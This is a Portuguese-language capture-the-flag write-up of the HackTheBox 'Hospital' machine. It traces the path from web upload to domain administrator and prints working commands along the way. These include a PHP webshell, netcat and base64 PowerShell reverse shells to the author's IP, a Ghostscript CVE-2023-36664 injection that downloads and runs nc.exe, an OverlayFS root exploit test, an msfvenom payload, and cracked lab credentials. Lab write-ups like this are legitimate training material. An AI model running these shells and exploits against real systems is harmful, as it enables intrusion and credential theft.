---
description: CTF do Hack The Box como fiz e anotações.
title: HackTheBox - Hospital - Fácil
date: 2024-01-30 22:39:00 +/-0300
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, windows, script, web, facil, WSL]     # TAG names should always be lowercase
show_image_post: true
---
![logo](/assets/img/hospital.png){: w="100" h="100" .left}

---
# **CTF - Hospital**
---
---
## **Enumeração**

### nmap

```shell
─     ~/HTB/hospital                                         ✔    
╰─ sudo nmap -sV -Pn --min-rate 10000 --stats-every=7s -p- 10.10.11.241 -oN
Nmap scan report for 10.10.11.241
Host is up (0.20s latency).
Not shown: 65506 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-01-28 05:49:25Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
1801/tcp  open  msmq?
2103/tcp  open  msrpc             Microsoft Windows RPC
2105/tcp  open  msrpc             Microsoft Windows RPC
2107/tcp  open  msrpc             Microsoft Windows RPC
2179/tcp  open  vmrdp?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
6404/tcp  open  tcpwrapped
6406/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp  open  msrpc             Microsoft Windows RPC
6409/tcp  open  msrpc             Microsoft Windows RPC
6616/tcp  open  msrpc             Microsoft Windows RPC
6635/tcp  open  msrpc             Microsoft Windows RPC
8080/tcp  open  http              Apache httpd 2.4.55 ((Ubuntu))
9389/tcp  open  mc-nmf            .NET Message Framing
10180/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.56 seconds
```
{: .nolineno }
domínio adicionado ao /etc/hosts

Domain: hospital.htb

página de login em `http://10.10.11.241:8080/login.php`
![Alt text](/assets/img/hospital1.png)

### ffuf na porta 8080

```shell
╭─     ~/HTB/hospital                                                                                                              ✔  18s   
╰─ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.11.241:8080/FUZZ -t 200 -e .php,.txt  -v -o ffuf.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.241:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .php .txt 
 :: Output file      : ffuf.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4734ms]
| URL | http://10.10.11.241:8080/.htaccess.txt
    * FUZZ: .htaccess.txt

[Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4736ms]
| URL | http://10.10.11.241:8080/.htpasswd.txt
    * FUZZ: .htpasswd.txt

[Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4753ms]
| URL | http://10.10.11.241:8080/.htaccess.php
    * FUZZ: .htaccess.php

[Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4764ms]
| URL | http://10.10.11.241:8080/.htaccess
    * FUZZ: .htaccess

[Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4765ms]
| URL | http://10.10.11.241:8080/.htpasswd.php
    * FUZZ: .htpasswd.php

[Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 6909ms]
| URL | http://10.10.11.241:8080/.htpasswd
    * FUZZ: .htpasswd

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 149ms]
| URL | http://10.10.11.241:8080/config.php
    * FUZZ: config.php

[Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 143ms]
| URL | http://10.10.11.241:8080/css
| --> | http://10.10.11.241:8080/css/
    * FUZZ: css

[Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 149ms]
| URL | http://10.10.11.241:8080/failed.php
    * FUZZ: failed.php

[Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 143ms]
| URL | http://10.10.11.241:8080/fonts
| --> | http://10.10.11.241:8080/fonts/
    * FUZZ: fonts

[Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 155ms]
| URL | http://10.10.11.241:8080/images
| --> | http://10.10.11.241:8080/images/
    * FUZZ: images

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 138ms]
| URL | http://10.10.11.241:8080/index.php
| --> | login.php
    * FUZZ: index.php

[Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 163ms]
| URL | http://10.10.11.241:8080/js
| --> | http://10.10.11.241:8080/js/
    * FUZZ: js

[Status: 200, Size: 5739, Words: 1551, Lines: 134, Duration: 140ms]
| URL | http://10.10.11.241:8080/login.php
    * FUZZ: login.php

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 149ms]
| URL | http://10.10.11.241:8080/logout.php
| --> | login.php
    * FUZZ: logout.php

[Status: 200, Size: 5125, Words: 1349, Lines: 114, Duration: 162ms]
| URL | http://10.10.11.241:8080/register.php
    * FUZZ: register.php

[Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 149ms]
| URL | http://10.10.11.241:8080/success.php
    * FUZZ: success.php

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 145ms]
| URL | http://10.10.11.241:8080/upload.php
    * FUZZ: upload.php

[Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 149ms]
| URL | http://10.10.11.241:8080/uploads
| --> | http://10.10.11.241:8080/uploads/
    * FUZZ: uploads

[Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 8439ms]
| URL | http://10.10.11.241:8080/server-status
    * FUZZ: server-status

[Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 151ms]
| URL | http://10.10.11.241:8080/vendor
| --> | http://10.10.11.241:8080/vendor/
    * FUZZ: vendor

:: Progress: [61407/61407] :: Job [1/1] :: 164 req/sec :: Duration: [0:01:31] :: Errors: 0 ::
```
{: .nolineno }
## **Acesso ao Linux**
### Webshell
Encontrado pagina de `registro e uploads`, a upload somente é acessível caso tenha um login, criei um login e agora tenho acesso a uploads.

Não foi possível envio de arquivo .php, vou usar o burp e descobrir quais extensões sao possíveis de enviar

Resultado das extensões que nos interessa.  
O processo abaixo tem aqui <http://n00br00t.github.io/posts/THM-vulnversity/#bursuite> passo a passo. Além do que está no link nesse você deve em settings marcar opção de follow redirect.
![Alt text](/assets/img/hospital2.png)

Renomeie meu reverse shell em php para `xd.phps`, upload com sucesso, porém não executou, deu erro.  
Em `phar` funciona porém não consegue se conectar ao meu netcat. testei 2 shells php, pentest monkey e essa simples  
`<?php echo shell_exec($_GET["cmd"]); ?>`

Pesquisando em outros writeup descobri que essa shell em php funciona <https://github.com/flozz/p0wny-shell>
## **Exploração**

Através da webshell conseguimos credenciais do banco de dados
![Alt text](/assets/img/hospital3.png)

```shell
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
```
{: .nolineno }
Aparentemente os arquivos que são feito upload somem depois de um tempo, então movi o xd.phar para raiz do site.

Usuário encontrado, não tenho acesso a sua home com o usuário data.
```shell
www-data@webserver:…/www/html# cat /etc/passwd |grep bash
root:x:0:0:root:/root:/bin/bash
drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
```
{: .nolineno }

Resolvi testar com kerbrute o usuário drwilliams, pra saber se no windows tem a credencial dele também. Essa box é windows com WSL (Windows Subsystem for Linux) instalado, então tem os 2 sistemas, linux e Windows.

```Shell
./kerbrute userenum --dc 10.10.11.241 -d hospital.htb dr -t 100 -o usersON.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/27/24 - Ronnie Flathers @ropnop

2024/01/27 22:24:03 >  Using KDC(s):
2024/01/27 22:24:03 >   10.10.11.241:88

2024/01/27 22:24:03 >  [+] VALID USERNAME:       drwilliams@hospital.htb
2024/01/27 22:24:03 >  Done! Tested 1 usernames (1 valid) in 0.142 seconds
```
{: .nolineno }

### Reverse Shell
Várias tentativas depois de revere shell e vários comandos, consultei o chatgpt e ele me passou o seguintes comandos


```shell
www-data@webserver:…/www/html# mkfifo /tmp/backpipe
www-data@webserver:…/www/html# ls /tmp
backpipe
f
www-data@webserver:…/www/html# /bin/bash 0</tmp/backpipe | nc 10.10.14.185 4443 1>/tmp/backpipe
```
{: .nolineno }
Conectei no DB :

```shell
MariaDB [hospital]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
|  3 | kali     | $2y$10$H11RgdmHabJZdWVTfPAGXexPolHb37ALpyw657qBPh1NuYRMx6m0K | 2024-01-28 07:11:38 |
+----+----------+--------------------------------------------------------------+---------------------+
```
{: .nolineno }
Copiei a hash do meu usuário kali pro de admin e loguei no site, apenas a mesma página de upload.
## **Escalação de Privilégio**
### Escalando para root
```shell
UPDATE users
SET password = (SELECT password FROM users WHERE username = 'kali')
WHERE username = 'admin';
```
{: .nolineno }
Rodei suid3num.py sem  binários SUIDS pra exploitar, linpeas também, e nada.

Pesquisei pela versão do kernel e encontrei essa página <https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/> , onde tem comando pra testar se esta vulnerável.
Usei o comando 
```shell
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"id\")'"
```
{: .nolineno }
Esta vulnerável!

Pesquisei por `CVE-2023-2640 Exploit` e encontrei esse exploit

<https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629>

Executado e temos root

![Alt text](/assets/img/hospital4.png)

Com isso peguei a hash do drwilliams no /etc/shadow e botei no john

```shell
root@webserver:/home/drwilliams/.ssh# cat /etc/shadow |grep -i drwill
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::

─     ~/HTB/hospital                                                                                                                       ✔ 
╰─ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 XOP 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwe123!@#        (?)     
1g 0:00:01:56 DONE (2024-01-28 00:33) 0.008605g/s 1843p/s 1843c/s 1843C/s r55555..pucci
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
{: .nolineno }


Credenciais  
`drwilliams@hospital.htb:qwe123!@#`
Com as credenciais consegui logar no webmail em   `https://hospital.htb`

Apenas contendo esse e-mail
![Alt text](/assets/img/hospital5.png)

Busquei na raiz por essa extensão e nada

find / -name "*.eps"

Também, consegui listar o SMB, porém nada util.

```shell
╭─     ~/HTB/hospital                                                                                                            ✔  2m 1s   
╰─ smbclient -L //10.10.11.241/ -U drwilliams
Password for [WORKGROUP\drwilliams]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
```
{: .nolineno }
## **Acesso ao Windows**
Pesquisa nos writeup porque travei aqui, 
No email diz sobre ghostscript e arquivos eps
Pesquisando no google `ghostscript eps exploit` achei esse exploit pra a inject de comandos no arquivo EPS

<https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection>

### Primeiro Método

Dei git clone e entrei na pasta
baixei o `nc.exe` aqui <https://github.com/int0x33/nc.exe/> para a mesma pasta.  
Copie o file.eps para file1.eps, tem que injetar dois comandos, um em cada arquivo pra funcionar corretamente, um para baixar o netcat e outro pra reverse shell.  
**Comando 1**  
Injetando o comando para o curl baixar o nc.exe  
`python3 CVE_2023_36664_exploit.py --inject --payload "curl -O http://10.10.14.185/nc.exe" --filename file.eps`  
abri outro terminal e rodei webserver com python  
`python -m http.server 80`  
**Comando 2**  
`python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.185 4242 -e cmd.exe" --filename file1.eps`  
abri outro terminal e rodei o netcat pra escutar na porta  
`nc -lvnp 4242`

> OBS: edite os ip dos comandos de acordo com o seu.
{: .prompt-tip }
Agora responda o e-mail anexando o file.eps e depois repita respondendo novamente enviando o file1.eps
Aguarde e em segundos serão executados os comandos, como pode ser visto abaixo na print.
Sinceramente não curti essa parte do CTF em que emula um Phishing. Muito difícil máquinas windows terem curl, ainda mais de um médico.
![Alt text](/assets/img/hospital6.png)

### Segundo método

Modo um arquivo e com powershell
Entre em <https://n00br00t.github.io/sh/> preencha os campos
Escolha powershell #3(Base64)
![Alt text](/assets/img/hospital7.png)

```shell
╭─     ~/HTB/hospital/CVE-2023-36664-Ghostscript     main ?5                                                                             ✔ 
╰─ python3 CVE_2023_36664_exploit.py --inject --payload "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADUAIgAsADQANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" --filename file.eps 
```
{: .nolineno }
Listei o netcat na porta e enviei o arquivo por email
```shell
╭─     ~/tools/Windows-Exploit-Suggester     master !1 ?3     ✔ 
╰─ nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.10.14.185] from (UNKNOWN) [10.10.11.241] 9131
whoami
hospital\drbrown
PS C:\Users\drbrown.HOSPITAL\Documents> 
```
{: .nolineno }
Muito mais rápido, e é powershell.

### Primeira flag
![Alt text](/assets/img/hospital8.png)

Em documents tem esse script com senha do drbrown

```shell
C:\Users\drbrown.HOSPITAL\Documents>type ghostscript.bat
type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
C:\Users\drbrown.HOSPITAL\Documents>
```
{: .nolineno }
senha:chr!$br0wn

## **Escalando Privilégio Windows**

Resolvi testar o metasploit para possível escalação de privilégio.

Gerando payload
baixei na máquina do drbrown e no linux executei

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.185 LPORT=4443 -f exe -o reverse.exe
```
{: .nolineno }
Payload executado no windows sessão recebida no meterpreter.
```shell
╭─     ~/HTB/hospital                                   ✔  16s   
╰─ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.185; set lport 4443; exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
lhost => 10.10.14.185
lport => 4443
[*] Started reverse TCP handler on 10.10.14.185:4443 
[*] Sending stage (200774 bytes) to 10.10.11.241
[*] Meterpreter session 1 opened (10.10.14.185:4443 -> 10.10.11.241:6092) at 2024-01-28 03:20:09 -0300

meterpreter > 
```
{: .nolineno }
Rodei o:  
`msf6 post(multi/manage/shell_to_meterpreter) > use post/multi/recon/local_exploit_suggester`  

Ele scaneia a a sessão atual por possiveis exploits que possa escalar privilégio, nenhum dos recomendados foi possível.
Conectei via evil-WinRM pra ter uma shell melhor, já que tenho a senha.

```shell
╭─     ~/HTB/hospital                                 1 ✘  26s   
╰─ evil-winrm -u drbrown -p 'chr!$br0wn' -i 10.10.11.241 

                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine           
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                             
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> 

```
{: .nolineno }
Seguindo writeup da box

Conectei via rpcclient e enumerei os usuários

```powershell
╭─     ~/HTB/hospital                                 1 ✘  35s   
╰─ rpcclient -U "drbrown" 10.10.11.241
Password for [WORKGROUP\drbrown]:
rpcclient $> querydispinfo
index: 0x2054 RID: 0x464 acb: 0x00020015 Account: $431000-R1KSAI1DGHMH  Name: (null)    Desc: (null)
index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2271 RID: 0x641 acb: 0x00000210 Account: drbrown       Name: Chris Brown       Desc: (null)
index: 0x2272 RID: 0x642 acb: 0x00000210 Account: drwilliams    Name: Lucy Williams     Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf0f RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2073 RID: 0x465 acb: 0x00020011 Account: SM_0559ce7ac4be4fc6a  Name: Microsoft Exchange Approval Assistant     Desc: (null)
index: 0x207e RID: 0x46d acb: 0x00020011 Account: SM_2fe3f3cbbafa4566a  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}       Desc: (null)
index: 0x207a RID: 0x46c acb: 0x00020011 Account: SM_5faa2be1160c4ead8  Name: Microsoft Exchange        Desc: (null)
index: 0x2079 RID: 0x46b acb: 0x00020011 Account: SM_6e9de17029164abdb  Name: E4E Encryption Store - Active     Desc: (null)
index: 0x2078 RID: 0x46a acb: 0x00020011 Account: SM_75554ef7137f41d68  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
index: 0x2075 RID: 0x467 acb: 0x00020011 Account: SM_9326b57ae8ea44309  Name: Microsoft Exchange        Desc: (null)
index: 0x2076 RID: 0x468 acb: 0x00020011 Account: SM_b1b9e7f83082488ea  Name: Discovery Search Mailbox  Desc: (null)
index: 0x2074 RID: 0x466 acb: 0x00020011 Account: SM_bb030ff39b6c4a2db  Name: Microsoft Exchange        Desc: (null)
index: 0x2077 RID: 0x469 acb: 0x00020011 Account: SM_e5b6f3aed4da4ac98  Name: Microsoft Exchange Migration      Desc: (null)
rpcclient $> 
```
{: .nolineno }
### Método 1 de escalar pŕivilégio.
Checando Listas de Controle de Acesso do xampp

```shell
*Evil-WinRM* PS C:\xampp\htdocs\default> icacls xampp
xampp NT AUTHORITY\LOCAL SERVICE:(I)(OI)(CI)(F)
      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
      BUILTIN\Administrators:(I)(OI)(CI)(F)
      BUILTIN\Users:(I)(OI)(CI)(RX)
      BUILTIN\Users:(I)(CI)(AD) --->>>  Permissão de adicionar dados
      BUILTIN\Users:(I)(CI)(WD) --->>> Permissãp de criação de diretórios
      CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```
{: .nolineno }
Em resumo, com base nessas informações, é possível que o XAMPP esteja sendo executado pelos privilégios do NT AUTHORITY\LOCAL SERVICE, NT AUTHORITY\SYSTEM
Por isso que quando executar a webshell vai ser com o usuário nt authority\system


Fazendo upload da p0wnyshell para o xampp
![Alt text](/assets/img/hospital9.png)
![Alt text](/assets/img/hospital10.png)

Buscando por arquivos txt na pasta Administrator

`DC$@DC:C:\Users\Administrator# dir /s /b *.txt`  
![Alt text](/assets/img/hospital11.png)

### Método 2 de escalar pŕivilégio.

Um jeito mais fácil pra escalar privilégio com o winpeas
Baixei o WinPEAS <https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe>  
Abri servidor python na pasta que baixou e execute os comando abaixo para fazer o download

```console
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> certutil -urlcache -f http://10.10.14.185/winPEASx64_ofs.exe winpeas.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> ls


    Directory: C:\Users\drbrown.HOSPITAL\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/23/2023   3:33 PM            373 ghostscript.bat
-a----        1/28/2024  11:31 PM        2234368 winpeas.exe
```
{: .nolineno }
![Alt text](/assets/img/hospital12.png)
Dando cat nesse arquivo conseguimos a senha de administrador.
![Alt text](/assets/img/hospital13.png)

Basta logar via evil-winrm

```shell
╭─     ~/HTB/hospital                                            ✔ 
╰─ evil-winrm -u administrator -p 'Th3B3stH0sp1t4l9786!' -i 10.10.11.241
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
hospital\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
{: .nolineno }

![Alt text](/assets/img/hospital14.png)